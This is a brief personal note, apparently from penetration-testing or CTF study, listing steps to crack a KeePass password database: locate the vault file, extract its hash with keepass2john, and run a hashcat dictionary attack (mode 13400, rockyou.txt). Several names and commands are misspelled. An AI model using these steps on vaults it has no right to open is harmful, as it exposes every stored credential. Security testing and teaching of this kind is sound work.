Default location:  
Program files/keepas

DB location:  
~/Documents/passwords.kddx

* To extract hash:  
* keepass2john.py passwords.kddx > pass.hash

* edit pass.hash to delete password: tag

* use hashcat to decript with dictionary:  
* hascat -m 13400 (keepass) -a 0 -w 1 pass.hash_modified DICTIONARI --force --show  
** Recomended dictionary: rockyou.txt

Open kddx file with keepass and put the password